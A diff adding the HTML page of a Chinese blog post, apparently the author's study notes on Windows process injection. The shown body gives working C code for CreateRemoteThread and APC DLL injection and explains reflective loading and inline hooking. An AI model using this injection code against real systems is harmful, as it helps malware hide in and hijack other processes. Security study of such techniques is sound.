@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="code-n4alrUzr1E" />
+    <meta name="description" content="学习一些基础的windows注入方式 代码仓库 https:&#x2F;&#x2F;github.com&#x2F;0range-x&#x2F;windows&#x2F;tree&#x2F;main&#x2F;injection CreateRemoteThread原理： 大多数Windows函数只允许一个进程对它自己操作，用来防止一个进程破坏另一个进程。但是，Windows提供了一些函数来让一个进程对另一个进程操作。 使用CreateRemoteThread 函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="process-injection">
+<meta property="og:url" content="https://0range-x.github.io/2022/11/12/inject/index.html">
+<meta property="og:site_name" content="0r@nge の窝">
+<meta property="og:description" content="学习一些基础的windows注入方式 代码仓库 https:&#x2F;&#x2F;github.com&#x2F;0range-x&#x2F;windows&#x2F;tree&#x2F;main&#x2F;injection CreateRemoteThread原理： 大多数Windows函数只允许一个进程对它自己操作，用来防止一个进程破坏另一个进程。但是，Windows提供了一些函数来让一个进程对另一个进程操作。 使用CreateRemoteThread 函数">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221012133914979.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221018162621742.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221019111241988.png">
+<meta property="og:image" content="https://www.malwarebytes.com/blog/images/uploads/2018/08/hollowing1-1_.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221019002721682.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221103233102407.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221020154416080.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221020154716646.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221020155051688.png">
+<meta property="og:image" content="https://www.malwarebytes.com/blog/images/uploads/2018/08/dopel1_.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221020165055844.png">
+<meta property="og:image" content="https://www.malwarebytes.com/blog/images/uploads/2018/08/osildr1-2_.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221026104451112.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221025142025472.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221024162837016.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221024230139418.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221027234502944.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221028004227315.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221028004250790.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221028093107278.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221028093423776.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221028093454512.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221028093840014.png">
+<meta property="article:published_time" content="2022-11-11T17:21:19.000Z">
+<meta property="article:modified_time" content="2022-11-11T17:33:06.484Z">
+<meta property="article:author" content="0r@nge">
+<meta property="article:tag" content=" windows">
+<meta property="article:tag" content="基础">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0range-x.github.io/2022/11/12/inject/image-20221012133914979.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icon.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>process-injection</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="0r@nge の窝" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links">Links</a></li><!--
+     --><!--
+       --><li><a href="/atom.xml">RSS</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/11/12/%E9%87%8D%E5%9B%9EPE%E7%BB%93%E6%9E%84/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0range-x.github.io/2022/11/12/inject/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0range-x.github.io/2022/11/12/inject/&text=process-injection"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0range-x.github.io/2022/11/12/inject/&title=process-injection"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0range-x.github.io/2022/11/12/inject/&is_video=false&description=process-injection"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=process-injection&body=Check out this article: https://0range-x.github.io/2022/11/12/inject/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0range-x.github.io/2022/11/12/inject/&title=process-injection"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0range-x.github.io/2022/11/12/inject/&title=process-injection"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0range-x.github.io/2022/11/12/inject/&title=process-injection"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0range-x.github.io/2022/11/12/inject/&title=process-injection"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0range-x.github.io/2022/11/12/inject/&name=process-injection&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0range-x.github.io/2022/11/12/inject/&t=process-injection"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CreateRemoteThread"><span class="toc-number">1.</span> <span class="toc-text">CreateRemoteThread</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apc%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">apc注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reflective-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">Reflective 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#API-Hook"><span class="toc-number">4.</span> <span class="toc-text">API Hook</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Inline-Hook%E8%A6%86%E7%9B%96%E4%BB%A3%E7%A0%81-%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E4%BB%A3%E7%A0%81"><span class="toc-number">4.0.1.</span> <span class="toc-text">Inline Hook覆盖代码 -修改函数代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IAT-hook-%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">4.0.2.</span> <span class="toc-text">IAT hook -修改函数地址</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hollowing"><span class="toc-number">5.</span> <span class="toc-text">hollowing</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#process-hollowing"><span class="toc-number">5.0.1.</span> <span class="toc-text">process hollowing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dll-hollowing%EF%BC%88Module-Stomping%EF%BC%89"><span class="toc-number">5.0.2.</span> <span class="toc-text">dll hollowing（Module Stomping）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Process-Doppelganging"><span class="toc-number">6.</span> <span class="toc-text">Process Doppelganging</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Transacted-Hollowing"><span class="toc-number">7.</span> <span class="toc-text">Transacted Hollowing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Process-Ghosting"><span class="toc-number">8.</span> <span class="toc-text">Process Ghosting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ghostly-Hollowing"><span class="toc-number">9.</span> <span class="toc-text">Ghostly Hollowing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#process-Herpaderping"><span class="toc-number">10.</span> <span class="toc-text">process Herpaderping</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        process-injection
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">0r@nge</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-11T17:21:19.000Z" itemprop="datePublished">2022-11-12</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/windows/">windows</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/windows/" rel="tag"> windows</a>, <a class="tag-link-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a>
+    </div>
+
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>学习一些基础的windows注入方式</p>
+<p>代码仓库</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0range-x/windows/tree/main/injection">https://github.com/0range-x/windows/tree/main/injection</a></p>
+<h2 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h2><p>原理：</p>
+<p>大多数Windows函数只允许一个进程对它自己操作，用来防止一个进程破坏另一个进程。但是，Windows提供了一些函数来让一个进程对另一个进程操作。</p>
+<p>使用CreateRemoteThread 函数在其他进程空间中创建一个线程。</p>
+<p>首先，程序在加载dll时，通常调用LoadLibrary 函数来实现dll的动态加载，loadlibrary只有一个参数，传递的是需要加载的dll路径字符串。</p>
+<p>程序首先获取目标进程空间某个dll字符串的地址，将loadlibrary函数的地址作为多线程函数的地址，某个dll字符串作为多线程函数的参数，并传递给CreateRemoteThread函数在目标进程空间创建一个多线程</p>
+<p>实现思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.获取被注入进程PID。</span><br><span class="line">2.在注入进程的访问令牌中开启SE_DEBUG_NAME权限。</span><br><span class="line">3.使用openOpenProcess()函数获取被注入进程句柄。</span><br><span class="line">4.使用VirtualAllocEx()函数在被注入进程内开辟缓冲区并使用WriteProcessMemory()函数写入DLL路径的字符串。</span><br><span class="line">5.使用GetProcAddress()函数在当前进程加载的kernel32.dll找到LoadLibraryA函数的地址。</span><br><span class="line">6.通过CreateRemoteThread()函数来调用LoadLibraryA()函数，在被注入进程新启动一个线程，使得被注入进程进程加载恶意的DLL。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>获取进程pid</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetProcessIdByName</span><span class="params">(LPCTSTR lpszProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32 pe;</span><br><span class="line">	pe.dwSize = <span class="keyword">sizeof</span> pe;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Process32First(hSnapshot, &amp;pe))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (lstrcmpi(lpszProcessName, pe.szExeFile) == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				CloseHandle(hSnapshot);</span><br><span class="line">				<span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (Process32Next(hSnapshot, &amp;pe));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hSnapshot);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, GetProcessIdByName((LPCTSTR)<span class="string">&quot;fg.exe&quot;</span>));</span><br><span class="line">	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, <span class="number">0</span>, <span class="number">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(hProcess, lpBaseAddress, path, <span class="keyword">sizeof</span>(path), <span class="literal">NULL</span>);</span><br><span class="line">	LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	CreateRemoteThread(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/12/inject/image-20221012133914979.png" alt="image-20221012133914979"></p>
+<h2 id="apc注入"><a href="#apc注入" class="headerlink" title="apc注入"></a>apc注入</h2><p>原理：</p>
+<p>apc为异步过程调用，指函数在指定线程中被异步执行。在Windows系统中，每个线程都会维护一个线程apc队列，通过QueryUserApc 把一个apc函数田家达奥指定线程的apc队列中。每个线程都有自己的apc队列，这个apc队列记录了要求线程执行的一些apc函数。</p>
+<p>一个进程包含多个线程，为了确保能够执行插入的apc，应该向目标进程的所有线程都插入相同的apc，实现加载dll的操作。这样，只要唤醒进程中的任意线程，开始执行apc的时候，便会执行插入的apc函数，实现dll注入</p>
+<p>步骤：</p>
+<p>可以看到需要找到目标线程，那么我们肯定是需要获取线程id，而在这之前需要先获取进程id，之后和远程线程注入的区别就在于 使用apc函数注入</p>
+<p>获取线程id</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetAllThreadIdByProcessId</span><span class="params">(DWORD dwProcessId)</span></span>&#123;</span><br><span class="line">	DWORD dwBufferLength = <span class="number">1000</span>;</span><br><span class="line">	THREADENTRY32 te32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HANDLE hSnapshot = <span class="literal">NULL</span>;</span><br><span class="line">	BOOL bRet = TRUE;</span><br><span class="line">	<span class="comment">// 获取线程快照</span></span><br><span class="line">	RtlZeroMemory(&amp;te32, <span class="keyword">sizeof</span>(te32));</span><br><span class="line">	te32.dwSize = <span class="keyword">sizeof</span>(te32);</span><br><span class="line">	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取第一条线程快照信息</span></span><br><span class="line">	bRet = Thread32First(hSnapshot, &amp;te32);</span><br><span class="line">	<span class="keyword">while</span> (bRet)&#123;</span><br><span class="line">		<span class="comment">// 获取进程对应的线程ID</span></span><br><span class="line">		<span class="keyword">if</span> (te32.th32OwnerProcessID == dwProcessId)&#123;</span><br><span class="line">			<span class="keyword">return</span> te32.th32ThreadID;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 遍历下一个线程快照信息</span></span><br><span class="line">		bRet = Thread32Next(hSnapshot, &amp;te32);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>main</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv)</span> </span>&#123;</span><br><span class="line">	FARPROC pLoadLibrary = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line">	DWORD dwTID = <span class="number">0</span>;</span><br><span class="line">	DWORD dwPID = <span class="number">0</span>;</span><br><span class="line">	BYTE dllname[] = <span class="string">&quot;C:\\users\\hack\\desktop\\test\\Dll.dll&quot;</span>;</span><br><span class="line">	LPVOID lpAddr = <span class="literal">NULL</span>;</span><br><span class="line">	dwPID = <span class="built_in">GetProcessIdByName</span>((LPCTSTR)<span class="string">&quot;fg.exe&quot;</span>);</span><br><span class="line">	hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, dwPID);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to OpenProcess. Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	pLoadLibrary = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pLoadLibrary == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to GetProcAddress. Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	lpAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(dllname) + <span class="number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (lpAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to VirtualAllocEx. Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, lpAddr, dllname, <span class="built_in"><span class="keyword">sizeof</span></span>(dllname) + <span class="number">1</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-]Failed to WriteProcessMemory. Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	dwTID = <span class="built_in">GetAllThreadIdByProcessId</span>(dwPID);</span><br><span class="line">	hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, TRUE, dwTID);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to OpenThread. Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">QueueUserAPC</span>((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)lpAddr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Inject successfully.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>错误总结：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.分配内存时 VirtualAllocEx 的第4个参数 只能用MEM_COMMIT,表示当前内存正在被使用 ,不能使用MEM_RELEASE</span><br><span class="line">2.测试失败，调试了很久，每一步都没报错，就是没有办法弹窗，在Win10 和win7 测试</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Reflective-注入"><a href="#Reflective-注入" class="headerlink" title="Reflective 注入"></a>Reflective 注入</h2><p>关键在于reflectiveloader </p>
+<p>原理：</p>
+<p>不依赖于Windows提供的loadlibrary 函数，设计者自己在程序内实现pe的内存展开，由于是自己实现，所以不会在操作系统中有记录。以及可以对展开的pe文件做一些处理，比如抹除dos头，同时不会再peb的ldr链表中记录。     </p>
+<p>步骤实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.获取被注入进程为解析的dll的及地址</span><br><span class="line">2.获得dll句柄和函数为修复导入表做准备</span><br><span class="line">3.分配一块新内存去解析dll，并把pe头复制到新内存中和将各节复制到新内存中</span><br><span class="line">4.修复重定向表和导入表</span><br><span class="line">5.执行dllmain函数 </span><br></pre></td></tr></table></figure>
+
+<p>在反射dll时，我们需要将dll的所有依赖库加载到当前进程中，并修复IAT以确保dll导入的函数指向当前进程内存空间的正确函数地址。为了加载依赖库，需要遍历所有的 Import Descriptor 。</p>
+<p>在读取并加载相应的库之后，我们需要遍历所有thunk，使用<code>GetProcAddress</code> 解析他们的地址并将他们放入IAT中，以便dll可以在需要时引用他们。</p>
+<p>在这之后，IAT修复完毕，可以执行dll了。</p>
+<p>tips：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD_PTR 这个类型可以放下一个DWORD类型 并且放下一个指针，在64位的环境下混用很可能造成程序越界崩溃</span><br><span class="line">*_ptr 是在64位的新类型用来代替32位下的DWORD</span><br></pre></td></tr></table></figure>
+
+<p>代码</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0range-x/windows/blob/main/injection/reflective.cpp">https://github.com/0range-x/windows/blob/main/injection/reflective.cpp</a></p>
+<h2 id="API-Hook"><a href="#API-Hook" class="headerlink" title="API Hook"></a>API Hook</h2><h4 id="Inline-Hook覆盖代码-修改函数代码"><a href="#Inline-Hook覆盖代码-修改函数代码" class="headerlink" title="Inline Hook覆盖代码 -修改函数代码"></a>Inline Hook覆盖代码 -修改函数代码</h4><p>可以看到这里代码有一点麻烦，相比较IAT hook，需要去看硬编码，但是如果函数不是以 <code>LoadLibrary</code>加载，就不会出现在导入表里，IAT hook就无法使用，只能使用InLine hook</p>
+<p>以messageboxA为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.获取MessageBoxA 函数的内存地址</span><br><span class="line">2.读取MessageBoxA的前6个字节</span><br><span class="line">3.创建一个hook函数 在被hook函数执行的时候执行</span><br><span class="line">4.获取hook函数的内存地址</span><br><span class="line">5.patch 被hook函数，重定向到hook函数</span><br><span class="line">6.调用被hook函数</span><br><span class="line">7.执行hook函数</span><br></pre></td></tr></table></figure>
+
+<p>messageboxA的地址<strong>76E60570</strong></p>
+<p>代码仓库：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0range-x/windows/blob/main/injection/jmphook.cpp">https://github.com/0range-x/windows/blob/main/injection/jmphook.cpp</a></p>
